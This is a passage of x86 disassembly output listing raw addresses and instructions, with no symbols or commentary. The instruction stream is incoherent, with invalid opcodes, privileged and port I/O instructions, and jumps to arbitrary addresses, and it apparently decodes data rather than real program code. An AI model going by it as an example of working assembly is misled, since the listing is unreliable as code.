  40fd0f:	fsubr  QWORD PTR [eax-0x76]
  40fd12:	mov    eax,0xc84ac20
  40fd17:	pushf  
  40fd18:	or     DWORD PTR [eax-0x38],esi
  40fd1b:	jl     0x40fd7e
  40fd1d:	fld    TBYTE PTR [eax-0x28]
  40fd20:	nop
  40fd21:	adc    BYTE PTR [ecx],0x7d
  40fd24:	xor    edi,esp
  40fd26:	push   es
  40fd27:	add    BYTE PTR [edi-0x49393925],cl
  40fd2d:	push   0x9f815b44
  40fd32:	ret    
  40fd33:	scas   eax,DWORD PTR es:[edi]
  40fd34:	mov    dh,0x1
  40fd36:	dec    edx
  40fd37:	aaa    
  40fd38:	pop    edx
  40fd39:	inc    esp
  40fd3a:	outs   dx,DWORD PTR ss:[esi]
  40fd3c:	inc    esi
  40fd3d:	out    dx,eax
  40fd3e:	das    
  40fd3f:	or     BYTE PTR [ebx],0xe5
  40fd42:	pop    ss
  40fd43:	add    al,0x7d
  40fd45:	cli    
  40fd46:	add    BYTE PTR [edx+0x4bc7fad],ah
  40fd4c:	(bad)  
  40fd4d:	cli    
  40fd4e:	les    ecx,FWORD PTR [esi]
  40fd50:	test   al,0xa2
  40fd52:	dec    edx
  40fd53:	retf   0x7f4
  40fd56:	and    eax,0xed6ed4f5
  40fd5b:	(bad)  
  40fd5c:	aas    
  40fd5d:	sub    dh,ch
  40fd5f:	rcl    BYTE PTR [edx+0x598cf0da],0x6c
  40fd66:	or     ebx,DWORD PTR [ebx-0x45]
  40fd69:	cmp    eax,edi
  40fd6b:	push   0x7a
  40fd6d:	xor    eax,0x2cfbbb28
  40fd72:	push   edx
  40fd73:	push   cs
  40fd74:	loop   0x40fd4c
  40fd76:	outs   dx,BYTE PTR ds:[esi]
  40fd77:	adc    eax,0x8c869ab6
  40fd7c:	mov    cl,0x2f
  40fd7e:	test   BYTE PTR [esi+0x58b75535],dh
  40fd84:	into   
  40fd85:	xchg   esi,eax
  40fd87:	in     eax,dx
  40fd88:	loopne 0x40fd25
  40fd8a:	ror    BYTE PTR [edi-0x12b44a46],0xe3
  40fd91:	out    0xaa,eax
  40fd93:	push   esi
  40fd94:	mov    bl,0x3
  40fd96:	je     0x40fd9d
  40fd98:	dec    ecx
  40fd99:	cmp    ah,BYTE PTR [ecx+0x1caae858]
  40fd9f:	ins    BYTE PTR es:[edi],dx
  40fda0:	dec    esp
  40fda1:	es cmp al,0xb6
  40fda4:	outs   dx,BYTE PTR ds:[esi]
  40fda5:	or     ebp,DWORD PTR [ebp+0x79]
  40fda8:	mov    DWORD PTR [edi],esi
  40fdaa:	mov    ecx,0x43d9bc29
  40fdaf:	movaps xmm2,xmm4
  40fdb2:	mov    dh,0xd5
  40fdb4:	dec    edx
  40fdb5:	jo     0x40fd3d
  40fdb7:	inc    edi
  40fdb8:	loopne 0x40fdb6
  40fdba:	scas   al,BYTE PTR es:[edi]
  40fdbb:	fadd   DWORD PTR [ecx]
  40fdbd:	je     0x40fd6a
  40fdbf:	jo     0x40fd4f
  40fdc1:	pop    edi
  40fdc2:	hlt    
  40fdc3:	sub    eax,DWORD PTR [ebx+0x35]
  40fdc6:	or     eax,0xf720ea36
  40fdcb:	fild   QWORD PTR [edx+0x50]
  40fdce:	lods   eax,DWORD PTR ds:[esi]
  40fdcf:	mov    dh,0xb1
  40fdd1:	xor    eax,0x988a90d5
  40fdd6:	inc    ecx
  40fdd7:	cmp    cl,al
  40fdd9:	arpl   WORD PTR [edi],si
  40fddb:	mov    DWORD PTR [edi-0x781e9ff2],esi
  40fde1:	jmp    0x7258057a
  40fde6:	push   0xb6a8ecb1
  40fdeb:	cld    
  40fdec:	sbb    ebp,DWORD PTR [eax-0x56f6fff1]
  40fdf2:	add    BYTE PTR [edi],dl
  40fdf4:	pusha  
  40fdf5:	jle    0x40fdda
  40fdf7:	push   ss
  40fdf8:	shl    DWORD PTR [esi-0x3843abeb],1
  40fdfe:	clc    
  40fdff:	(bad)  
  40fe01:	ret    0xdb6d
  40fe04:	mov    dh,0x38
  40fe06:	mov    BYTE PTR [ebp+0x6e],ah
  40fe09:	xchg   edx,eax
  40fe0a:	inc    esi
  40fe0b:	sbb    eax,0x1b97afcb
  40fe10:	pop    ebp
  40fe11:	rol    BYTE PTR [ebp+0x1ef1f891],0xdc
  40fe18:	xchg   DWORD PTR [ebx+edi*4],ecx
  40fe1b:	mov    ch,0x5b
  40fe1d:	test   DWORD PTR [ecx+0x7f],ecx
  40fe20:	mov    ch,0xab
  40fe22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe23:	ret    0xca7a
  40fe26:	add    dl,BYTE PTR [edx+0x65b555ad]
  40fe2c:	aad    0xde
  40fe2e:	dec    ebp
  40fe2f:	jge    0x40fe42
  40fe31:	(bad)  [ebp+0x33b8c2c2]
  40fe37:	idiv   DWORD PTR [ebx]
  40fe39:	sbb    DWORD PTR [esi],ecx
  40fe3b:	mov    ds:0xdf8dd792,al
  40fe40:	dec    edx
  40fe41:	aaa    
  40fe42:	or     dl,dh
  40fe44:	xor    BYTE PTR [eax],bl
  40fe46:	mov    edi,0x3cc0e0d1
  40fe4b:	add    BYTE PTR [edi-0x72],al
  40fe4e:	push   0xffffffdb
  40fe50:	xchg   esi,eax
  40fe51:	xor    al,0xf9
  40fe53:	das    
  40fe54:	adc    DWORD PTR [edx-0x6],edi
  40fe57:	mov    ch,0x15
  40fe59:	(bad)  
  40fe5b:	test   DWORD PTR [ecx],esp
  40fe5d:	test   DWORD PTR [ecx-0x1a],ebx
  40fe60:	xchg   ebp,eax
  40fe61:	add    bh,BYTE PTR [edx-0x257925e9]
  40fe67:	ss mov ecx,0x103865fa
  40fe6d:	inc    eax
  40fe6e:	mov    al,ds:0x6dd0506e
  40fe73:	imul   edx,DWORD PTR [edi+0x1a6171bf],0xb
  40fe7a:	inc    ecx
  40fe7b:	out    dx,eax
  40fe7c:	loope  0x40fe70
  40fe7e:	mov    al,0x6d
  40fe80:	pop    ebx
  40fe81:	pop    es
  40fe82:	idiv   DWORD PTR [edx]
  40fe84:	and    ecx,DWORD PTR [edi+0x336e523e]
  40fe8a:	mov    es,WORD PTR [edx-0x2f]
  40fe8d:	mov    dh,0xe2
  40fe8f:	push   edi
  40fe90:	ds push ds
  40fe92:	sbb    BYTE PTR ds:[ebp+0x6e8009ad],al
  40fe99:	pop    es
  40fe9a:	out    0x68,al
  40fe9c:	pop    ebp
  40fe9d:	xchg   ecx,eax
  40fe9e:	ins    DWORD PTR es:[edi],dx
  40fe9f:	pop    ebx
  40fea0:	push   0xbdf865b7
  40fea5:	lods   eax,DWORD PTR ds:[esi]
  40fea6:	xchg   BYTE PTR [eax],ch
  40fea8:	outs   dx,DWORD PTR ds:[esi]
  40fea9:	loopne 0x40fe91
  40feab:	sti    
  40feac:	pop    ebx
  40fead:	push   edi
  40feae:	(bad)  
  40feaf:	shl    BYTE PTR [ebx+0x28],cl
  40feb2:	ret    0xbc26
  40feb5:	push   edi
  40feb6:	(bad)  
  40feb7:	clc    
  40feb8:	mov    ch,0xd5
  40feba:	cs sub eax,0x4ef40558
  40fec0:	lods   eax,DWORD PTR ds:[esi]
  40fec1:	or     eax,0xd8a8e49b
  40fec6:	mov    eax,0xbdf3e04f
  40fecb:	sub    eax,0x82a6da98
  40fed0:	dec    ebx
  40fed1:	add    edx,edx
  40fed3:	std    
  40fed4:	jno    0x40ff4e
  40fed6:	jb     0x40ff31
  40fed8:	(bad)  
  40fed9:	and    eax,0xdba1db68
  40fede:	cmp    BYTE PTR [edi],al
  40fee0:	mov    edx,0xb5a300b6
  40fee5:	fnsave [esi-0x1f7d702b]
  40feeb:	mov    dl,0xe2
  40feed:	jmp    0xa5440f86
  40fef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef3:	ins    DWORD PTR es:[edi],dx
  40fef4:	imul   esi,DWORD PTR [edi-0x2c345908],0xda95f1a7
  40fefe:	sbb    dh,BYTE PTR ss:[edi+0x548f5924]
  40ff05:	xor    ebx,eax
  40ff07:	sub    al,0x2c
  40ff09:	push   eax
  40ff0a:	mov    dh,0xad
  40ff0c:	fcomp  QWORD PTR [eax+0x14]
  40ff0f:	dec    eax
  40ff10:	imul   eax,DWORD PTR [ebx],0x47aa9b57
  40ff16:	inc    ebx
  40ff17:	imul   ebp,DWORD PTR [ecx+0x69],0x329e92db
  40ff1e:	push   es
  40ff1f:	sbb    cl,BYTE PTR ds:0x4b86d0c8
  40ff25:	dec    ebx
  40ff26:	add    eax,0xe3140068
  40ff2b:	add    DWORD PTR [ecx+eax*1+0x37],0xa76ea81a
  40ff33:	jnp    0x40ff17
  40ff35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff36:	pusha  
  40ff37:	lea    edi,[ebx+0x2f96026f]
  40ff3d:	ins    BYTE PTR es:[edi],dx
  40ff3e:	or     BYTE PTR [edx],cl
  40ff40:	and    eax,0x2edb00e5
  40ff45:	mov    dh,0x6c
  40ff47:	cmp    BYTE PTR [esi],dl
  40ff49:	call   0x9fc6:0x7c7f9abe
  40ff50:	pop    edi
  40ff51:	stos   DWORD PTR es:[edi],eax
  40ff52:	test   al,0xab
  40ff54:	fild   QWORD PTR cs:[ebp-0x3d]
  40ff58:	loop   0x40ffce
  40ff5a:	push   esi
  40ff5b:	ins    BYTE PTR es:[edi],dx
  40ff5c:	test   ebx,ebx
  40ff5e:	inc    esi
  40ff5f:	daa    
  40ff60:	push   ss
  40ff61:	out    0xde,al
  40ff63:	fs icebp 
  40ff65:	mov    esp,0x2eda2a50
  40ff6a:	sub    al,0x40
  40ff6c:	dec    edi
  40ff6d:	xor    al,0xfe
  40ff6f:	jne    0x40ff3f
  40ff71:	mov    DWORD PTR [ecx+0x69],esp
  40ff74:	popa   
  40ff75:	jmp    0x40ff2a
  40ff77:	push   edx
  40ff78:	in     al,dx
  40ff79:	or     eax,0x2de0382b
  40ff7e:	call   0x6e1b3694
  40ff83:	ror    BYTE PTR [ebx],0xa0
  40ff86:	push   cs
  40ff87:	dec    edx
  40ff88:	and    esi,ecx
  40ff8a:	pop    es
  40ff8b:	push   eax
  40ff8c:	imul   edi,DWORD PTR [ebx+0x26644435],0x835cdef9
  40ff96:	jno    0x40ff25
  40ff98:	ins    DWORD PTR es:[edi],dx
  40ff99:	jmp    0x40ff3b
  40ff9b:	sti    
  40ff9c:	loop   0x40ffdc
  40ff9e:	fwait
  40ff9f:	cmp    al,0x6e
  40ffa1:	mov    bh,0x6
  40ffa3:	adc    eax,0x99adb6dc
  40ffa8:	scas   eax,DWORD PTR es:[edi]
  40ffa9:	pop    ebx
  40ffaa:	inc    esp
  40ffab:	pop    ebx
  40ffac:	xchg   BYTE PTR [edx-0x27412796],ah
  40ffb2:	fadd   DWORD PTR [ebx+0x2bc02b0a]
  40ffb8:	mov    edx,0x83c11a67
  40ffbd:	ins    DWORD PTR es:[edi],dx
  40ffbe:	fcmovnu st,st(2)
  40ffc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffc1:	mov    DWORD PTR [ebx],edx
  40ffc3:	jns    0x40ff90
  40ffc5:	push   ss
  40ffc6:	cmp    al,0x83
  40ffc9:	in     eax,dx
  40ffca:	push   edx
  40ffcb:	mov    ebx,0xfb627c
  40ffd0:	sbb    eax,0x17449776
  40ffd5:	pop    esp
  40ffd6:	push   ds
  40ffd7:	sahf   
  40ffd8:	mov    dh,0xb4
  40ffda:	mov    cl,0xb5
  40ffdc:	in     eax,dx
  40ffdd:	jge    0x410014
  40ffdf:	xor    al,BYTE PTR [esi]
  40ffe1:	es jp  0x41000f
  40ffe4:	clc    
  40ffe5:	adc    al,ch
  40ffe7:	rol    dl,cl
  40ffe9:	mov    ss,WORD PTR [esp+ecx*2-0x75b8059]
  40fff0:	pusha  
  40fff1:	adc    eax,eax
  40fff3:	sub    edx,esp
  40fff5:	fxam   
  40fff7:	or     eax,DWORD PTR [esi-0x49]
  40fffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fffb:	lods   eax,DWORD PTR ds:[esi]
  40fffc:	fnstsw WORD PTR [ebx-0x50]
  40ffff:	mov    ebx,0x71625668
  410004:	inc    esp
  410005:	xchg   edx,eax
  410006:	xor    cl,BYTE PTR [ebx+0x11d6ed8]
  41000c:	pop    ecx
  41000d:	cdq    
  41000e:	cwde   
  41000f:	cdq    
  410010:	rcl    BYTE PTR [ecx],0xc
  410013:	shr    DWORD PTR [ebp-0x5a08d793],0xcc
  41001a:	bound  ecx,QWORD PTR [ebp-0x5e]
  41001d:	or     BYTE PTR [edi],dl
  41001f:	pop    esp
  410020:	sub    al,0x74
  410022:	jbe    0x40ffd7
  410024:	mov    ds:0xc73196a6,eax
  410029:	mov    BYTE PTR [esi+0x61],al
  41002c:	adc    eax,DWORD PTR [eax]
  41002e:	lods   al,BYTE PTR ds:[esi]
  41002f:	stos   BYTE PTR es:[edi],al
  410030:	bound  ebx,QWORD PTR [esi+0x36]
  410033:	mov    ebx,0xbcdb6ed4
  410038:	add    ch,al
  41003a:	pop    edi
  41003b:	out    0x36,eax
  41003d:	xlat   BYTE PTR ds:[ebx]
  41003e:	pop    ss
  41003f:	jle    0x410010
  410041:	mov    ecx,0x5ba8baad
  410046:	clc    
  410047:	es into 
  410049:	leave  
  41004a:	cmp    ebp,eax
  41004c:	or     ecx,DWORD PTR [ebp-0x60c73526]
  410052:	pop    ecx
  410053:	pop    esp
  410054:	adc    ah,ch
  410056:	and    dl,cl
  410058:	ss mov dh,0xb
  41005b:	loop   0x410041
  41005d:	nop
  41005e:	ds adc eax,0x8d8c33bd
  410064:	mov    al,ds:0xf715b82b
  410069:	mov    dh,0x8c
  41006b:	inc    ebx
  41006c:	call   0x7dc1:0xa064101d
  410073:	push   cs
  410074:	out    0x6d,al
  410076:	inc    eax
  410077:	or     eax,0x3d796441
  41007c:	inc    esi
  41007d:	inc    edx
  41007e:	stos   DWORD PTR es:[edi],eax
  41007f:	sub    ch,BYTE PTR [ecx+esi*1-0x26]
  410083:	test   eax,0x6e877fbc
  410088:	in     eax,dx
  410089:	(bad)  
  41008a:	push   edx
  41008b:	or     eax,0x1a02f5a7
  410090:	or     ch,BYTE PTR [edx+0x2f]
  410093:	inc    esi
  410094:	pop    ss
  410095:	les    eax,FWORD PTR [ebp+0x1d879711]
  41009b:	daa    
  41009c:	lahf   
  41009d:	in     eax,dx
  41009e:	aad    0x16
  4100a0:	mov    dh,0xdb
  4100a2:	je     0x410069
  4100a4:	jle    0x410112
  4100a6:	cwde   
  4100a7:	pop    ds
  4100a8:	pop    ebx
  4100a9:	stc    
  4100aa:	or     DWORD PTR [esi+0x5416df88],0xffffffad
  4100b1:	sbb    eax,0xdd1f030f
  4100b6:	fcomp  st(2)
  4100b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100b9:	test   eax,0xa717e14a
  4100be:	mov    dh,0x9a
  4100c0:	leave  
  4100c1:	in     eax,0xd3
  4100c3:	push   ebx
  4100c4:	les    esi,FWORD PTR [esi+0x64e4a7b0]
  4100ca:	test   al,0x2
  4100cc:	clc    
  4100cd:	xchg   esi,eax
  4100ce:	popa   
  4100cf:	mov    ds:0xdcf96083,eax
  4100d4:	mov    ebx,0x649203ec
  4100d9:	call   0x36b64830
  4100de:	rcl    DWORD PTR [esi],1
  4100e0:	mov    dl,0x11
  4100e2:	stos   WORD PTR es:[edi],ax
  4100e4:	pop    ebx
  4100e5:	pop    ss
  4100e6:	les    ecx,FWORD PTR [esi]
  4100e8:	inc    ebx
  4100e9:	mov    ecx,0x981421e3
  4100ee:	mov    eax,0x6d6e02ec
  4100f3:	mov    dh,0x29
  4100f5:	pop    es
  4100f6:	add    dh,BYTE PTR [edx-0x16]
  4100f9:	mov    edx,0x4035b43f
  4100fe:	sub    al,0xc7
  410100:	je     0x41016e
  410102:	pop    ebp
  410103:	into   
  410104:	fldcw  WORD PTR [ebp+0x6c]
  410107:	in     eax,dx
  410108:	mov    dh,0xec
  41010a:	add    DWORD PTR [ebx-0x7d],ebp
  41010d:	sub    dl,bh
  41010f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410110:	add    ch,BYTE PTR [ebx-0x27df947e]
  410116:	cs jecxz 0x410185
  410119:	out    dx,al
  41011a:	retf   
  41011b:	dec    ecx
  41011c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41011d:	in     al,0x2
  41011f:	or     bl,dl
  410121:	ret    0xc06d
  410124:	inc    esp
  410125:	mov    esp,0xc53e61ba
  41012a:	fcmovnbe st,st(2)
  41012c:	ret    0x7dd6
  41012f:	outs   dx,BYTE PTR ds:[esi]
  410130:	cmp    DWORD PTR [eax],edx
  410132:	mov    bh,0x59
  410134:	ja     0x4101a7
  410136:	mov    dh,0xbb
  410138:	mov    cl,0x6d
  41013a:	dec    ebx
  41013b:	jp     0x41014f
  41013d:	into   
  41013e:	jg     0x410120
  410140:	xchg   esi,eax
  410141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410142:	div    BYTE PTR [edx]
  410144:	sahf   
  410145:	lods   eax,DWORD PTR ds:[esi]
  410146:	sub    eax,ebp
  410148:	inc    esi
  410149:	mov    ah,0xbe
  41014b:	or     BYTE PTR [esi+eax*4],ch
  41014e:	out    0x37,al
  410150:	mov    dh,0x6d
  410152:	add    DWORD PTR [edi+0x44024d18],0xf18a7014
  41015c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41015d:	mov    dh,0xe
  41015f:	fiadd  DWORD PTR [edi+edi*8-0xf]
  410163:	xor    al,0x91
  410165:	mov    bh,0x71
  410167:	cwde   
  410168:	sub    al,0x74
  41016a:	push   ebp
  41016b:	fadd   QWORD PTR [eax-0x17c004d6]
  410171:	loop   0x410153
  410173:	fstp   QWORD PTR [eax+0x6a]
  410176:	inc    eax
  410177:	jge    0x41016e
  410179:	fidivr DWORD PTR [edi]
  41017b:	(bad)  
  41017c:	adc    al,0x26
  41017e:	or     al,0xc1
  410180:	mov    dh,0xe3
  410182:	jp     0x41013d
  410184:	xlat   BYTE PTR ds:[ebx]
  410185:	gs popa 
  410187:	fstp   st(0)
  410189:	push   0x53db8edb
  41018e:	sub    al,0xe6
  410190:	sub    eax,ecx
  410192:	add    esp,DWORD PTR [eax+0x74b6c042]
  410198:	mov    eax,ds:0x862ca050
  41019d:	lds    esi,FWORD PTR [eax-0x71]
  4101a0:	push   edx
  4101a1:	mov    ah,0xa3
  4101a3:	fiadd  DWORD PTR [ecx]
  4101a5:	das    
  4101a6:	icebp  
  4101a7:	cwde   
  4101a8:	dec    ecx
  4101a9:	mov    ds:0xd40adb8a,al
  4101ae:	push   esp
  4101af:	in     al,0x3e
  4101b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101b2:	ds stos DWORD PTR es:[edi],eax
  4101b4:	add    bl,al
  4101b6:	mov    dh,0x6d
  4101b8:	popa   
  4101b9:	xor    DWORD PTR [edx+ebx*4],0xa91d48a4
  4101c0:	sub    ebp,esi
  4101c2:	jbe    0x41022f
  4101c4:	imul   ebx,DWORD PTR [ecx+edx*4-0x4d],0xffffffc4
  4101c9:	ss adc BYTE PTR gs:[esi+edi*2],al
  4101ce:	in     eax,dx
  4101cf:	clc    
  4101d0:	pop    ebx
  4101d1:	clc    
  4101d2:	les    ecx,FWORD PTR [ebp+0x3d8a84f9]
  4101d8:	inc    eax
  4101d9:	frstor [esi+0x1b6b05e4]
  4101df:	mov    al,ds:0x390d445b
  4101e4:	out    dx,eax
  4101e5:	or     edx,0xaaa505ef
  4101eb:	lea    ebp,[ebp+0x74]
  4101ee:	xlat   BYTE PTR ds:[ebx]
  4101ef:	inc    edx
  4101f0:	mov    ah,0x3d
  4101f2:	adc    DWORD PTR [esi+edi*4-0x4c],edx
  4101f6:	inc    ebp
  4101f7:	jp     0x4101d8
  4101f9:	lods   eax,DWORD PTR ds:[esi]
  4101fa:	push   ebp
  4101fb:	add    BYTE PTR [ebx-0x292d124f],ah
  410201:	mov    dh,0xb
  410203:	jae    0x410234
  410205:	icebp  
  410206:	std    
  410207:	xchg   ebp,eax
  410208:	xchg   ebp,eax
  410209:	pop    esi
  41020a:	cmc    
  41020b:	or     eax,esp
  41020d:	ret    0xb06
  410210:	xchg   edi,eax
  410211:	or     BYTE PTR [ebx],bh
  410213:	sbb    ebp,DWORD PTR [eax]
  410215:	xor    DWORD PTR [esp+eax*2],ebp
  410218:	sub    DWORD PTR [edx+0x61],ebx
  41021b:	fbstp  TBYTE PTR [esp+esi*8+0x3db0a055]
  410222:	(bad)  
  410223:	(bad)  
  410224:	pop    ss
  410225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410226:	mov    esp,DWORD PTR [esi+0x1742edf2]
  41022c:	lahf   
  41022d:	pop    eax
  41022e:	jg     0x410217
  410230:	and    BYTE PTR [ebx+0x4a80084],dh
  410236:	jne    0x41029b
  410238:	popa   
  410239:	or     DWORD PTR [esi+eax*8+0x372d3f34],0x79
  410241:	adc    eax,0x7f046a8
  410246:	jecxz  0x41025b
  410248:	repz mov ds:0x712c6d05,al
  41024e:	sbb    BYTE PTR [ecx+0x5ba8416a],dh
  410254:	mov    ebx,0xdcd103b5
  410259:	inc    esi
  41025a:	aam    0x20
  41025c:	sub    DWORD PTR ds:0xed00d006,ebp
  410262:	pushf  
  410263:	xchg   ebx,eax
  410264:	retf   
  410265:	(bad)  
  410266:	xor    eax,0xb7688d83
  41026b:	lods   eax,DWORD PTR ds:[esi]
  41026c:	test   eax,0xda7e920c
  410271:	pop    ss
  410272:	xor    eax,0xa82eb715
  410277:	test   DWORD PTR [esp+esi*1+0x2c],0xa3b61a34
  41027f:	outs   dx,BYTE PTR ds:[esi]
  410280:	sbb    eax,0x2475686
  410285:	(bad)  
  410286:	cmp    al,0x5d
  410288:	gs sahf 
  41028a:	lods   eax,DWORD PTR ds:[esi]
  41028b:	dec    ebx
  41028c:	scas   al,BYTE PTR es:[edi]
  41028d:	mov    dh,0xe
  41028f:	add    al,0xc2
  410291:	inc    edi
  410292:	dec    edi
  410293:	hlt    
  410294:	sbb    bl,0xd6
  410297:	(bad)  
  410298:	xchg   esi,eax
  410299:	std    
  41029a:	mov    WORD PTR [ebx],?
  41029c:	bound  ebx,QWORD PTR [esi+0x46]
  41029f:	sahf   
  4102a0:	lds    edi,FWORD PTR [ebx-0x7f]
  4102a3:	mov    dh,0xd0
  4102a5:	outs   dx,BYTE PTR ds:[esi]
  4102a6:	xchg   edx,eax
  4102a7:	fdivr  st,st(7)
  4102a9:	add    ch,dh
  4102ab:	imul   eax,DWORD PTR [eax-0x3495a27b],0x42
  4102b2:	sbb    al,0x10
  4102b4:	pop    ss
  4102b5:	mov    WORD PTR [esi+ecx*1+0xd4b1b4c],cs
  4102bc:	stos   BYTE PTR es:[edi],al
  4102bd:	dec    ebp
  4102be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102bf:	sub    DWORD PTR [ebp+eiz*4-0x45ae4939],ecx
  4102c6:	xchg   ebp,eax
  4102c7:	add    DWORD PTR [ebp-0x10],edi
  4102ca:	inc    ecx
  4102cb:	jp     0x410284
  4102cd:	rcl    BYTE PTR [ecx],0x1d
  4102d0:	mov    ch,0xa1
  4102d2:	call   0x5cc11c1b
  4102d7:	add    eax,0x68b67106
  4102dc:	or     BYTE PTR [esi+0x38],ch
  4102df:	sahf   
  4102e0:	or     ebp,edi
  4102e2:	xchg   edx,eax
  4102e3:	test   al,0xee
  4102e5:	or     eax,0xa4dadb60
  4102ea:	mov    DWORD PTR [ecx],esi
  4102ec:	loope  0x41026e
  4102ee:	in     al,dx
  4102ef:	pop    esp
  4102f0:	lods   eax,DWORD PTR ds:[esi]
  4102f1:	and    BYTE PTR [esi-0x6415aa78],0x30
  4102f8:	mov    ebx,0xaa6fca39
  4102fd:	add    cl,BYTE PTR ds:0xcfa29900
  410303:	mov    esi,es
  410305:	or     BYTE PTR [ebx],0x74
  410308:	mov    ds:0xb1c66a03,eax
  41030d:	xchg   ebx,eax
  41030e:	adc    dl,dl
  410310:	addr16 push eax
  410312:	xchg   dl,bl
  410314:	add    al,0xb4
  410316:	sub    DWORD PTR [esi+0x2aec113d],esi
  41031c:	outs   dx,BYTE PTR ds:[esi]
  41031d:	cmp    esi,DWORD PTR [edx-0x4b5c9326]
  410323:	mov    dh,0x9e
  410325:	fidiv  DWORD PTR [esi-0x35]
  410328:	sbb    dl,BYTE PTR [edi+esi*2+0x3e]
  41032c:	aas    
  41032d:	sub    ecx,DWORD PTR [esi+edx*4-0x3a]
  410331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410332:	ins    DWORD PTR es:[edi],dx
  410333:	fcmovne st,st(0)
  410335:	mov    DWORD PTR [ecx+0x11],esi
  410338:	in     al,dx
  410339:	add    edx,0xffffffc8
  41033c:	out    0x60,eax
  41033e:	fcmovnb st,st(2)
  410340:	push   esi
  410341:	mov    al,ds:0x6ac6e665
  410346:	inc    eax
  410347:	mov    edi,0x2e281a2c
  41034c:	ins    BYTE PTR es:[edi],dx
  41034d:	enter  0x8271,0x9c
  410351:	mov    ebp,esp
  410353:	and    al,0xb6
  410355:	inc    esi
  410356:	push   eax
  410357:	and    bl,BYTE PTR ds:0x55cb2355
  41035d:	jo     0x41038a
  41035f:	fadd   QWORD PTR [edi-0x69]
  410362:	fld    DWORD PTR [edx+eiz*2]
  410365:	cdq    
  410366:	fnstenv [eax-0x15]
  410369:	and    dl,bl
  41036b:	aaa    
  41036c:	mov    WORD PTR [ebx+0x1d],es
  41036f:	xchg   esp,eax
  410370:	xchg   al,bh
  410372:	idiv   DWORD PTR [ebx-0x15ea293b]
  410378:	loopne 0x41039a
  41037a:	shl    DWORD PTR [ebx+0x54],cl
  41037d:	jle    0x4103a5
  41037f:	sub    ebp,edx
  410381:	test   al,0x5b
  410383:	retf   
  410384:	js     0x4103f3
  410386:	movsx  ecx,dx
  410389:	sbb    BYTE PTR es:[ebx],0x5b
  41038d:	clc    
  41038e:	lds    ebp,FWORD PTR [edx+ebp*8-0xd]
  410392:	push   es
  410393:	fimul  DWORD PTR [edx+0x4b]
  410396:	fneni(8087 only) 
  410398:	mov    al,ds:0x37ef8f8f
  41039d:	je     0x4103e0
  41039f:	push   ss
  4103a0:	dec    ebx
  4103a1:	pop    ebx
  4103a2:	adc    ebx,DWORD PTR [ebp+0x1a]
  4103a5:	fiadd  WORD PTR [ecx-0x43]
  4103a8:	out    dx,al
  4103a9:	sahf   
  4103aa:	push   cs
  4103ab:	pop    esp
  4103ac:	test   DWORD PTR [ebx+0x6a],ebx
  4103af:	frstpm(287 only) 
  4103b1:	out    dx,eax
  4103b2:	add    BYTE PTR [ecx+edx*4],ch
  4103b5:	xchg   esi,eax
  4103b6:	das    
  4103b7:	test   BYTE PTR [esi+ecx*8-0x724931bf],cl
  4103be:	jbe    0x410423
  4103c0:	sbb    DWORD PTR [eax],0xf62afc7
  4103c6:	mov    ss,WORD PTR [edx+0x285b6888]
  4103cc:	(bad)  [eax+0xc]
  4103cf:	sbb    edx,DWORD PTR [esi+0x7]
  4103d2:	int3   
  4103d3:	imul   edx,DWORD PTR [ebp+ebp*4+0x482362ab],0x50
  4103db:	inc    ebp
  4103dc:	sbb    DWORD PTR [ecx-0x5e],eax
  4103df:	jno    0x41044c
  4103e1:	mov    bh,0xc2
  4103e3:	out    0x24,al
  4103e5:	adc    bh,bl
  4103e7:	pop    edi
  4103e8:	dec    ebp
  4103e9:	lock leave 
  4103eb:	lea    esi,[esi+0x5b]
  4103ee:	fcom   DWORD PTR [ebx+0x68ec3749]
  4103f4:	out    dx,eax
  4103f5:	sahf   
  4103f6:	mov    bl,0xb4
  4103f8:	mov    dh,0xc2
  4103fa:	ins    DWORD PTR es:[edi],dx
  4103fb:	sub    DWORD PTR [ebp-0x28],0x71873e80
  410402:	test   esi,ecx
  410404:	fs xchg esi,eax
  410406:	pop    edx
  410407:	push   0xb1ca7b37
  41040c:	pop    edi
  41040d:	jns    0x4103e1
  41040f:	sub    dl,BYTE PTR [ebx]
  410411:	pop    edx
  410412:	rcl    DWORD PTR [esi-0x28c448de],1
  410418:	sbb    BYTE PTR [esi],dh
  41041a:	mov    dh,0xa2
  41041c:	push   ss
  41041d:	scas   eax,DWORD PTR es:[edi]
  41041e:	sub    eax,0x7509072a
  410423:	fimul  DWORD PTR [eax]
  410425:	call   0x14cf:0x4fcde0a0
  41042c:	pop    ebp
  41042d:	push   0x16138c0a
  410432:	or     BYTE PTR [ecx-0x7b],dl
  410435:	and    edi,DWORD PTR [edx-0xca3bb2f]
  41043b:	add    al,0x48
  41043d:	cmp    al,0xc2
  41043f:	inc    edx
  410440:	(bad)
  410443:	shr    ah,cl
  410445:	xor    al,0x96
  410447:	(bad)  
  410449:	inc    edi
  41044a:	sub    DWORD PTR [esi+0x3b32818d],esi
  410450:	push   esi
  410451:	push   edx
  410452:	or     eax,esp
  410454:	add    al,BYTE PTR ds:0x7c339802
  41045a:	and    ch,BYTE PTR [esi-0x1b]
  41045d:	pop    ebx
  41045e:	stos   DWORD PTR es:[edi],eax
  41045f:	mov    ds:0xf2008253,eax
  410464:	mov    eax,ds:0x96a7c37d
  410469:	sub    eax,0x681b809a
  41046e:	in     eax,dx
  41046f:	mov    esi,0xdb637072
  410474:	xchg   esi,eax
  410475:	das    
  410476:	test   BYTE PTR [ebp+0x34],ah
  410479:	add    eax,0xa0c51214
  41047e:	or     ah,BYTE PTR [eax-0x25]
  410481:	push   eax
  410482:	adc    BYTE PTR [eax+ebp*1+0x68b6239e],bl
  410489:	fucomp st(0)
